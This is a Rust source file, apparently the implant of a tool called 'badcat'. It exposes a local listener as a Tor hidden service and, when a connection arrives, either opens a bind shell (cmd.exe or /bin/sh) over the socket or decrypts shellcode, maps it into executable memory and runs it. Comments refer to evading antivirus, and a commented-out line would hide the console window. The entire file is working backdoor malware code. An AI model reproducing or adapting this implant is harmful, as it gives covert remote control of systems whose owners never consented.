// #![windows_subsystem = "windows"]

mod config;
mod setting;

use std::fs::File;
use std::net::{TcpListener, TcpStream};
use std::path::PathBuf;
use std::process::{Child, Command, Stdio};
use std::{error, mem, ptr};

use badcat_lib::io;
use memmap::MmapMut;

fn main() -> Result<(), Box<dyn error::Error>> {
    let setting = setting::Setting::new()?;

    start_tcp_server(&setting)?;

    Ok(())
}

fn unbundle_torrc(
    path: &PathBuf,
    port: u16,
    setting: &setting::Setting,
) -> Result<(), Box<dyn error::Error>> {
    let mut contents = setting.torrc.clone();

    contents = contents.replace("@{DATA_DIR}", setting.tor_dir.to_str().unwrap());

    contents = contents.replace(
        "@{CTRL_COOKIE}",
        setting.tor_dir.join("ctrl.cookie").to_str().unwrap(),
    );

    contents = contents.replace(
        "@{CTRL_SOCKET}",
        setting.tor_dir.join("ctrl.socket").to_str().unwrap(),
    );

    contents = contents.replace("@{SERVICE_ADDR}", &format!("127.0.0.1:{}", port));

    std::fs::write(&path, &contents)?;

    Ok(())
}

fn start_tor_binary(
    torrc: &PathBuf,
    setting: &setting::Setting,
) -> Result<Child, Box<dyn error::Error>> {
    let mut executable = setting.tor_dir.join(&setting.name);

    if cfg!(windows) {
        executable.set_extension("exe");
    }

    // Fix directory permission - linux build requires this
    if cfg!(unix) || cfg!(macos) {
        let status = Command::new("chmod")
            .args(["700", setting.tor_dir.to_str().unwrap()])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()?;

        if !status.success() {
            return Result::Err(String::from("problem setting app directory permision").into());
        }
    }

    let log = setting.tor_dir.join("log.txt");

    let stdout: File = File::create(&log)?;
    let stderr: File = File::create(&log)?;

    let proc = Command::new(executable)
        .args(["-f", torrc.to_str().unwrap()])
        .stdin(Stdio::null())
        .stdout(stdout)
        .stderr(stderr)
        .spawn()?;

    Ok(proc)
}

fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
    let listener = TcpListener::bind("127.0.0.1:0")?;
    let port = listener.local_addr()?.port();
    println!("listening at: {:?}", port);

    let torrc = &setting.tor_dir.join("config");
    unbundle_torrc(&torrc, port, &setting)?;

    let mut tor_proc = start_tor_binary(&torrc, &setting)?;

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                if setting.uses_payload {
                    // decrypt payload. now the shellcode goes to memory
                    // and may get detected by AV by now
                    let payload = setting::get_payload(&setting)?;

                    // tor hidden service will be our shellcode later,
                    // so it need to be restarted
                    tor_proc.kill()?;

                    // set hidden service port as payload port
                    unbundle_torrc(&torrc, payload.lport, &setting)?;

                    // restart tor
                    tor_proc = start_tor_binary(&torrc, &setting)?;

                    execute_payload(payload.data)?;

                    break;
                } else {
                    match bind_shell(stream) {
                        Ok(()) => {}
                        Err(error) => println!("connection error: {:?}", error),
                    };
                }
            }
            Err(error) => return Err(Box::new(error)),
        }
    }

    tor_proc.kill()?;

    Ok(())
}

fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
    let mut args: Vec<&str> = Vec::new();

    let shell = if cfg!(windows) {
        "cmd.exe"
    } else {
        args.push("-i");
        "/bin/sh"
    };

    let proc = Command::new(shell)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let stdin = proc.stdin.unwrap();
    let stdout = proc.stdout.unwrap();
    let stderr = proc.stderr.unwrap();

    let stream_in = stream.try_clone()?;
    let stream_out = stream.try_clone()?;
    let stream_err = stream.try_clone()?;

    let in_thread = io::pipe_io(stream_in, stdin);
    let out_thread = io::pipe_io(stdout, stream_out);
    let err_thread = io::pipe_io(stderr, stream_err);

    in_thread.join().unwrap();
    out_thread.join().unwrap();
    err_thread.join().unwrap();

    Ok(())
}

fn execute_payload(payload: Vec<u8>) -> Result<(), Box<dyn error::Error>> {
    let len = payload.len();

    // writable memory
    let mut w_map = MmapMut::map_anon(len)?;

    unsafe {
        // write shellcode
        ptr::copy(payload.as_ptr(), w_map.as_mut_ptr(), len);

        // transition to readable/executable memory
        let x_map = w_map.make_exec()?;

        let code: extern "C" fn() -> ! = mem::transmute(x_map.as_ptr());
        code();
    };
}
